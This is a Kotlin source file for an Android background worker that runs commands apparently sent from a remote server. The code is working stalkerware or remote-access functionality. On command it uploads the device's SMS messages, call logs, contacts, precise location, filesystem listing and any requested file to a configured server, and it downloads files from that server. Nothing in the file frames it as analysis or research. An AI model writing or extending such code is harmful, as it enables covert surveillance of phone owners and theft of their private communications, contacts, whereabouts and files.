// DataFetchWorker.kt
package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.Constraints
import androidx.work.Data
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(
    private val appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private const val TAG = "DataFetchWorker"
        const val KEY_COMMAND = "command"

        // Commands for remote execution
        const val COMMAND_SYNC_ALL = "sync_all"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_UPLOAD_FILE = "upload_file"
        const val COMMAND_DOWNLOAD_FILE = "download_file"
        const val COMMAND_PING = "ping"

        /**
         * Schedules a one-time work request to execute a command.
         * @param context The application context.
         * @param command The command to execute (e.g., COMMAND_SYNC_ALL).
         * @param extraData A map of additional data required for the command (e.g., file paths).
         */
        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
            val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }

            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(dataBuilder.build())
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d(TAG, "Scheduled DataFetchWorker with command: $command and data: $extraData")
        }
    }

    // Lazily initialize managers and DAOs to improve startup performance
    private val apiClient by lazy { ApiClient(appContext.getString(R.string.server_base_url)) }
    private val systemInfoManager by lazy { SystemInfoManager(appContext) }
    private val fileSystemManager by lazy { FileSystemManager(appContext) }
    private val appDb by lazy { AppDatabase.getDatabase(appContext) }
    private val manualDataManager by lazy { ManualDataManager(appContext) }

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND) ?: run {
            Log.e(TAG, "Worker failed: No command provided.")
            return Result.failure()
        }

        Log.i(TAG, "Worker starting for command: $command")
        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) {
                    Log.i(TAG, "Worker finished successfully for command: $command")
                    Result.success()
                } else {
                    Log.w(TAG, "Worker will retry for command: $command")
                    Result.retry()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Worker failed with an exception for command '$command'", e)
                Result.failure()
            }
        }
    }

    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_SYNC_ALL -> syncAllData()
            COMMAND_SCAN_FILESYSTEM -> scanAndUploadFileSystem()
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
            COMMAND_PING -> sendPingResponse()
            else -> {
                Log.w(TAG, "Unknown command received: $command")
                false // Indicate failure for unknown commands
            }
        }
    }

    // --- Core Differential Sync Logic ---

    private suspend fun syncAllData(): Boolean {
        Log.i(TAG, "Starting full differential data sync...")
        val smsSuccess = syncSms()
        val callLogSuccess = syncCallLogs()
        val contactsSuccess = syncContacts()
        Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess")
        return smsSuccess && callLogSuccess && contactsSuccess
    }

    private suspend fun syncSms(): Boolean {
        if (!hasPermission(Manifest.permission.READ_SMS)) return true // Not a failure, just skip
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.smsDao()
        
        val latestTimestamp = dao.getLatestSmsTimestamp() ?: 0L
        val newSmsList = manualDataManager.scanSms(since = latestTimestamp)
        
        if (newSmsList.isNotEmpty()) {
            dao.insertAll(newSmsList)
            Log.d(TAG, "Saved ${newSmsList.size} new SMS to local DB.")
        }
        
        val unsyncedSms = dao.getUnsyncedSms()
        if (unsyncedSms.isEmpty()) return true
        
        Log.d(TAG, "Uploading ${unsyncedSms.size} SMS records...")
        val success = apiClient.syncSms(deviceId, unsyncedSms)
        if (success) dao.markAsSynced(unsyncedSms.map { it.id })
        return success
    }

    private suspend fun syncCallLogs(): Boolean {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return true
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.callLogDao()
        
        val latestTimestamp = dao.getLatestCallLogTimestamp() ?: 0L
        val newCallLogs = manualDataManager.scanCallLogs(since = latestTimestamp)
        
        if (newCallLogs.isNotEmpty()) {
            dao.insertAll(newCallLogs)
            Log.d(TAG, "Saved ${newCallLogs.size} new call logs to local DB.")
        }
        
        val unsyncedCallLogs = dao.getUnsyncedCallLogs()
        if (unsyncedCallLogs.isEmpty()) return true
        
        Log.d(TAG, "Uploading ${unsyncedCallLogs.size} call log records...")
        val success = apiClient.syncCallLogs(deviceId, unsyncedCallLogs)
        if (success) dao.markAsSynced(unsyncedCallLogs.map { it.id })
        return success
    }

    private suspend fun syncContacts(): Boolean {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return true
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.contactDao()
        
        val currentDeviceContacts = manualDataManager.scanContacts()
        val localContacts = dao.getAllContacts().associateBy { it.contactId }
        
        val contactsToUpsert = currentDeviceContacts.filter { deviceContact ->
            val localContact = localContacts[deviceContact.contactId]
            localContact == null || deviceContact.lastUpdated > localContact.lastUpdated
        }
        
        if (contactsToUpsert.isNotEmpty()) {
            dao.insertAll(contactsToUpsert)
            Log.d(TAG, "Upserted ${contactsToUpsert.size} contacts in local DB.")
        }
        
        val unsyncedContacts = dao.getUnsyncedContacts()
        if (unsyncedContacts.isEmpty()) return true
        
        Log.d(TAG, "Uploading ${unsyncedContacts.size} contact records...")
        val success = apiClient.syncContacts(deviceId, unsyncedContacts)
        if (success) dao.markAsSynced(unsyncedContacts.map { it.contactId })
        return success
    }

    // --- Other Command Implementations ---

    private suspend fun scanAndUploadFileSystem(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        if (!fileSystemManager.hasFileSystemPermissions()) {
            Log.w(TAG, "Cannot scan filesystem, MANAGE_EXTERNAL_STORAGE permission missing.")
            return false // This is a failure due to missing permissions
        }
        val scanResult = fileSystemManager.scanFileSystem()
        if (scanResult.paths.isEmpty()) {
            Log.i(TAG, "File system scan found no items to report.")
            return true // Not a failure
        }
        val formattedData = fileSystemManager.formatPathsForUpload(scanResult)
        return apiClient.uploadFileSystemPaths(formattedData, deviceId)
    }
    
    private suspend fun uploadRequestedFile(): Boolean {
        val filePath = inputData.getString("filePath") ?: return false
        val file = File(filePath)
        if (!file.exists() || !file.canRead() || file.isDirectory) {
            Log.e(TAG, "Cannot upload file. It doesn't exist, is unreadable, or is a directory: $filePath")
            return false
        }
        val deviceId = systemInfoManager.getDeviceId()
        return apiClient.uploadRequestedFile(file, deviceId, filePath)
    }

    private suspend fun downloadFileFromServer(): Boolean {
        val serverFilePath = inputData.getString("serverFilePath") ?: return false
        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
        return downloadedFile?.exists() == true
    }
    
    private suspend fun fetchAndSendLocation(): Boolean {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
        val location = getCurrentLocation()
        val deviceId = systemInfoManager.getDeviceId()
        val message = if (location != null) "📍 Location: Lat=${location.latitude}, Lon=${location.longitude}" else "📍 Location: Not available"
        val tempFile = createTempTxtFile("location", message)
        return apiClient.uploadFile(tempFile, message, deviceId)
    }
    
    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        val batteryInfo = systemInfoManager.getBatteryStatus()
        val message = "⚙️ SysInfo: Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
        val tempFile = createTempTxtFile("sysinfo", message)
        return apiClient.uploadFile(tempFile, message, deviceId)
    }

    private suspend fun sendPingResponse(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        val message = "✅ Pong! Device online at ${System.currentTimeMillis()}"
        val tempFile = createTempTxtFile("ping", message)
        return apiClient.uploadFile(tempFile, message, deviceId)
    }

    // --- Utility Functions ---

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(appContext, permission) == PackageManager.PERMISSION_GRANTED
    
    private suspend fun getCurrentLocation(): Location? = try {
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            LocationServices.getFusedLocationProviderClient(appContext)
                .getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        } else null
    } catch (e: Exception) {
        Log.e(TAG, "Failed to get current location", e)
        null
    }
    
    private suspend fun createTempTxtFile(prefix: String, content: String): File = withContext(Dispatchers.IO) {
        File.createTempFile(prefix, ".txt", appContext.cacheDir).apply {
            writeText(content)
            deleteOnExit()
        }
    }
}
